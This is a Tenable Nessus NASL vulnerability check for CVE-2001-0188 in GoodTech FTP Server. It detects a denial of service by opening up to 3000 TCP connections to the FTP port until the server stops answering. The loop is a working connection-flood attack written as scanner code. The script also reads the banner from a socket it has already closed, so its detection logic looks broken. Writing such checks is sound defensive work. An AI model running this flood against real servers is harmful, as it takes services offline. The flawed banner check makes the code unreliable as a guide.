#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10690);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2001-0188");
 script_bugtraq_id(2270);
 script_xref(name:"OSVDB", value:"13803");
 
 script_name(english:"GoodTech FTP Server Connection Saturation DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote ftp server is prone to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running GoodTech FTP Server for Windows. 

It was possible to disable the remote FTP server by connecting to it
about 3000 separate times.  If the remote server is running from
within [x]inetd, this is a feature and the FTP server should
automatically be back in a couple of minutes.  An attacker may use
this flaw to prevent this service from working properly." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-01/0350.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to a version of GoodTech FTP server later than 3.0.1.2.1.0." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"connections attempts overflow");
 script_category(ACT_FLOOD);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(get_port_state(port))
{
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  close(soc);

  r = recv_line(socket:soc, length:4096);
  if ( "GoodTech" >!< r ) exit(0);
  
  for(i=0;i<3000;i=i+1)
  {
   soc = open_sock_tcp(port);
   if(!soc)
   {
    i = 3001;
    security_warning(port);
    exit(0);
   }
   close(soc);
  }
}
